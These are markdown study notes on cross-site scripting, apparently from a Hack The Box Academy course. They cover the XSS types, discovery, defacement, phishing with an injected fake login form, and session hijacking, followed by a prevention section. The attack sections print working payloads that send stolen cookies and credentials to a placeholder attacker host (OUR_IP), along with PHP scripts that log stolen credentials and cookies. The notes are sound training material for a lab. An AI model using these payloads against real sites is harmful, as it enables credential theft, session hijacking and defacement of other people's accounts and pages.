
# Table of Contents  
* **XSS Basics**
    * [Introduction](#introduction)
    * [Types of XSS](#types-of-xss)
    * [XSS Testing Payloads](#xss-testing-payloads)
    * [Stored / Persistent XSS](#stored--persistent-xss)
    * [Reflected XSS](#reflected-xss)
    * [DOM XSS](#dom-xss)
        * [Source & Sink](#source--sink)
        * [DOM Attacks](#dom-attacks)
    * [XSS Discovery : Automated Discovery](#xss-discovery--automated-discovery)
    * [XSS Discovery : Manual Discovery](#xss-discovery--manual-discovery)
        * [XSS Payloads](#xss-payloads)
        * [Code Review](#code-review)
* **XSS Attacks**
    * [Defacing](#defacing)
        * [Defacement Elements](#defacement-elements)
        * [Defacement Elements : Changing Background](#defacement-elements--changing-background)
        * [Defacement Elements : Background Image](#defacement-elements--background-image)
        * [Defacement Elements : Changing Page Title](#defacement-elements--changing-page-title)
        * [Defacement Elements : Changing Page Text](#defacement-elements--changing-page-text)
        * [Defacement Elements : Changing Entire HTML Code of the main body](#defacement-elements--changing-entire-html-code-of-the-main-body)
        * [Defacement : Final Payload](#defacement--final-payload)
    * [Phishing](#phishing)
        * [Step 01 : XSS Discovery](#step-01--reflected-xss-discovery)
        * [Step 02 : Login Form Injection](#step-02--login-form-injection)
        * [Step 03 : Cleaning Up](#step-03--cleaning-up)
        * [Step 04 : Credential Stealing](#step-04--credential-stealing)
    * [Session Hijacking](#session-hijacking)
        * [Step 01 : (Blind) XSS Detection](#step-01--blind-xss-detection)
        * [Step 02 : Loading a Remote Script](#step-02--loading-a-remote-script)
        * [Step 03 : Session Hijacking](#step-03--session-hijacking)
* [**XSS Prevention**](#xss-prevention)
    * [Front End : Input Validation](#front-end--input-sanitization)
    * [Front End : Input Sanitization](#front-end--input-sanitization)
    * [Front End : Direct Input](#front-end--direct-input)
    * [Back-end : Input Validation](#back-end--input-validation)
    * [Back-end : Input Sanitization](#back-end--input-sanitization)
    * [Back-end : Output HTML Encoding](#back-end--output-html-encoding)
    * [Back-end : Server Configuration](#back-end--server-configuration)
* **Skill Assessment**


# Introduction
* [OWASP Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* A flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side,
* low impact + high probability = medium risk
* In modern browsers, they are also limited to the same domain of the vulnerable website.

> Note : If a skilled researcher identifies a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome), they can utilize an XSS vulnerability to execute a JavaScript exploit on the target's browser, which eventually breaks out of the browser's sandbox and executes code on the user's machine.

* Actual Exploits:
    * Stealing users' credit card information, 
    * installing key loggers on their browsers
    * Exploiting a binary vulnerability in user's web browsers (which was more common in web browsers back then).


# Types of XSS
|Type	|Description|
|--|--|
|Stored (Persistent) XSS	|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|Reflected (Non-Persistent) XSS	|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|DOM-based XSS	|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|


# XSS Testing Payloads
```javascript
<test>
<plaintext> //stop rendering the HTML code that comes after it and display it as plaintext.
<script>alert(window.origin)</script>
<script>print()</script> //pop up the browser print dialog, which is unlikely to be blocked by any browsers.

// DOM Payload
<img src=x onerror=alert(windows.origin)>

// Confirm the existence of the vulnerability by looking at the page source
```


# Stored / Persistent XSS
* Injected XSS payload gets stored in the back-end database and retrieved upon visiting the page
* Stored XSS may not be easily removable, and the payload may need removing from the back-end database
* Affect any user that visits the page

> Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

> * Refresh the page and if still xss payload code is executed, meaning it is stored xss.


# Reflected XSS
* Processed by the backend server
* Vulnerabilities are temporary and are not persistent through page refreshes
* Affect the targeted user and will not affect other users who visit the page
* Our input reaches the back-end server and gets returned to us without being filtered or sanitized

> Note: To target a user, we can send them a URL containing our payload


# DOM XSS
* Document Object Model (DOM)
* Processed on the client-side through JavaScript
* Occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

> Important : 
> * We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end.
> * Furthermore, if we look at the page source by hitting CTRL+U, we will notice that our test string is nowhere to be found. This is because the JavaScript code is updating the page when we click the Add button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. Non-Persistent). 
> * We can still view the rendered page source with the Web Inspector tool by clicking CTRL+SHIFT+C

## Source & Sink
* The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field.
* The Sink is the function that writes the user input to a DOM Object on the page.
* If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack.
* Commonly used JavaScript functions to write to DOM objects are:
    * document.write()
    * DOM.innerHTML
    * DOM.outerHTML
* Some of the jQuery library functions that write to DOM objects are:
    * add()
    * after()
    * append()

> Important :
* So, we do see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.

## DOM Attacks
* If we try the XSS payload we have been using previously, we will see that it will not execute. 
* This is because the innerHTML function does not allow the use of the `<script>` tags within it as a security feature. 
* Still, there are many other XSS payloads we use that do not contain `<script>` tags, like the following XSS payload: `<img src=x onerror=alert(window.origin)>`
* To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads.
DOM XSS Payload : `http://154.57.164.78:36502/?#task=<img src=x onerror=alert(window.origin)>>`
URL Encoded Payload : `http://154.57.164.78:36502/?#task=%3Cimg%20src=x%20onerror=alert(window.origin)%3E%3E`

# XSS Discovery : Automated Discovery
* Tools : [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), [ZAP](https://www.zaproxy.org/)
* Open Source Tools : [XSS Strike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS), [XSSer](https://github.com/epsylon/xsser)
```shell
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike

#Create a virtual environment
python3 -m venv venv
#Activate the environment:
Mac/Linux : source venv/bin/activate

pip install -r requirements.txt
python xsstrike.py

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```


# XSS Discovery : Manual Discovery
* Basic XSS vulnerabilities can usually be found through testing various XSS payloads, but identifying advanced XSS vulnerabilities requires advanced code review skills.

## XSS Payloads
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[payload-box](https://github.com/payload-box/xss-payload-list)

> Note : 
> * Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

> Tip : It may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered

## Code Review
* Should cover both back-end and front-end code


# Defacing
*  Most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. 
*  Defacing a website means changing its look for anyone who visits the website.

## Defacement Elements
* Four HTML elements are usually utilized to change the main look of a web page:
    * Background Color document.body.style.background
    * Background document.body.background
    * Page Title document.title
    * Page Text DOM.innerHTML
> TIP : We can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.

## Defacement Elements : Changing Background
```javascript
<script>document.body.style.background = "#141d2b"</script>
```

> Tip : Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like = "black".

## Defacement Elements : Background Image
```javascript
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Defacement Elements : Changing Page Title
```javscript
<script>document.title = 'HackTheBox Academy'</script>
```

## Defacement Elements : Changing Page Text
```javscript
<script>document.getElementById("todo").innerHTML = "New Text"</script>
```

* We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the jQuery library must have been imported within the page source):
```javascript
// <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script>$("#todo").html('New Text');</script>
```

## Defacement Elements : Changing Entire HTML Code of the main body
```javascript
<script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>
```

> TIP : 
> * Before sending our payload and making a permanent change, we should prepare our HTML code separately and then use innerHTML to set our HTML code to the page source.
> * It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.

## Defacement : Final Payload
* This usually can be done in stored XSS scenario

```javascript
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

> Important : If our ur injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added after it, so we would have to account for them to get the final look we need.


# Phishing
* Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker
* Example : Injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

## Step 01 : (Reflected) XSS Discovery
* Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page.

> Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.

## Step 02 : Login Form Injection
* To perform an XSS phishing attack, we must inject HTML code that displays a login form on the targeted page. 
* This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
* In the above HTML code, OUR_IP is the IP of our VM, which we can find with the (ip a) command under tun0. We will later be listening on this IP to retrieve the credentials sent from the form.
* Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function document.write(), and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the write function, the final JavaScript code should be as follows:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Step 03 : Cleaning Up
* To encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function document.getElementById().remove() function.
* To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking CTRL+SHIFT+C and then clicking on the element we need.
```javascript
document.getElementById('urlform').remove();
```

> **Final Code**
> ```javascript
> document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
> ```

* We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
```html
...PAYLOAD... <!-- 
```

## Step 04 : Credential Stealing
* Start a netcat server & observe the request
```shell
nc -lvnp 80
```
* However, as we are only listening with a netcat listener, it will not handle the HTTP request correctly, and the victim would get an Unable to connect error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
* The following PHP script should do what we need, and we will write it to a file on our VM that we'll call index.php and place it in /tmp/tmpserver/ (don't forget to replace SERVER_IP with the ip from our exercise):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
* Now that we have our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier:
```shell
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```


# Session Hijacking
* With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka `Cookie Stealing`) attack.

## Step 01 : Blind XSS Detection
* A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
* Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:
    * Contact Forms
    * Reviews
    * User Details
    * Support Tickets
    * HTTP User-Agent header

## Step 02 : Loading a Remote Script
```javascript
<script src="http://OUR_IP/script.js"></script>
<script src="http://OUR_IP/username"></script>
```

* [PayloadAllTHeThings - Blind XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

> Important : Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.

* Before we start sending payloads, we need to start a listener on our VM, using netcat or php as shown in a previous section:
```shell 
nc -lnvp 80

mkdir /tmp/tmpserver
cd /tmp/tmpserver
php -S 0.0.0.0:80
```

* Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP
```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
```

> Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

## Step 03 : Session Hijacking 
* It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
* There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

* Create a new script.js file on the hacker machine
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

* Change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload):
```javascript
<script src=http://OUR_IP/script.js></script>
```

> Important :  if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

```php
//index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

# XSS Prevention
* A `Source` like a user input field and a `Sink` that displays the input data.
* Focus on securing, both in the front-end and in the back-end

> Important aspect is proper input sanitization and validation on both the front and back end

## Front End : Input Validation
* Example : Email Validation Code
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

## Front End : Input Sanitization
* Escaping any special characters {< = &lt>}
* Example :
```javascript
function sanitize(string) {
  const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      "/": '&#x2F;',
  };
  const reg = /[&<>"'/]/ig;
  return string.replace(reg, (match)=>(map[match]));
}
```
* Utilizing [DOMPurtify](https://github.com/cure53/DOMPurify) javascript library
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

## Front End : Direct Input
* Ensure that we never use user input directly  like
    1. JavaScript code <script></script>
    2. CSS Style Code <style></style>
    3. Tag/Attribute Fields <div name='INPUT'></div>
    4. HTML Comments <!-- -->
* In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
    * DOM.innerHTML
    * DOM.outerHTML
    * document.write()
    * document.writeln()
    * document.domain
*  jQuery functions: 
    * html()
    * parseHTML()
    * add()
    * append()
    * prepend()
    * after()
    * insertAfter()
    * before()
    * insertBefore()
    * replaceAll()
    * replaceWith()
* As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.

## Back-end : Input Validation:
* Uses Regex or library functions to ensure that the input field is what is expected
* Example : E-mail validation on PHP backend
```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```
* Example : Email Validation on NodeJS backend
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

## Back-end : Input Sanitization
* There are very strong libraries for various back-end languages that can properly sanitize any user input, such that we ensure that no injection can occur.
* Example: For a PHP back-end, we can use the addslashes function to sanitize user input by escaping special characters with a backslash:
```php
addslashes($_GET['email'])
```
* Example: For NodeJS we can use [DOMPurtify](https://github.com/cure53/DOMPurify) javascript library
```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

## Back-end : Output HTML Encoding
* Encode any special characters into their HTML codes
* Example :  For a PHP back-end, we can use the htmlspecialchars or the htmlentities functions, which would encode certain special characters into their HTML codes (e.g. < into &lt;), so the browser will display them correctly, but they will not cause any injection of any sort:
```php
htmlentities($_GET['email']);
```
* Example : For a NodeJS back-end, we can use any library that does HTML encoding, like html-entities, as follows:
```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

## Back-end : Server Configuration
* Using HTTPS across the entire domain.
* Using XSS prevention headers.
* Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.
* Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.
* Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

> Important
* Having a good Web Application Firewall (WAF) can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests.
* Some frameworks provide built-in XSS protection, like [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).

 